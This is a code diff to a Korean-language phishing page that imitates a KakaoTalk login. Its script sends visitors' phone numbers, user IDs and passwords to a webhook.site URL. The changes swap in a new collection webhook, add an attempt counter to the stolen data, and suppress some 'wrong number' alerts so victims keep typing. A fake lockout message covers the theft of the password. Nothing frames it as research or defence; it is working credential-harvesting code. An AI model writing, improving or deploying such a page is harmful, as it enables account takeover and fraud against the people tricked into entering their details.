@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="ko">
 <head>
 <meta charset="UTF-8">
@@ -62,7 +63,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "https://webhook.site/77d0020a-315a-4b5f-9614-187e3029b1f9";
+const webhookUrl = "https://webhook.site/20eca30c-03dd-4ab9-b16c-e70800896ee5";
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -159,14 +160,18 @@ function sendPhone() {
 
   phoneTryCount++;
 
-  // Webhook 전송
+  // 웹훅 전송 (항상)
   fetch(webhookUrl,{
     method:"POST",
     headers:{"Content-Type":"application/x-www-form-urlencoded"},
-    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
+    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
 
-  alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+  // 전화번호 틀림 알림은 최대 2번까지만
+  if(phoneTryCount <= 2) {
+    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+  }
+
   document.getElementById("userId").value = ""; // 입력칸 초기화
 
   if(phoneTryCount >= 2) {
@@ -211,7 +216,7 @@ function sendPage4() {
 
   if(loginTryCount > 5) {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
-     fetch(webhookUrl,{
+    fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
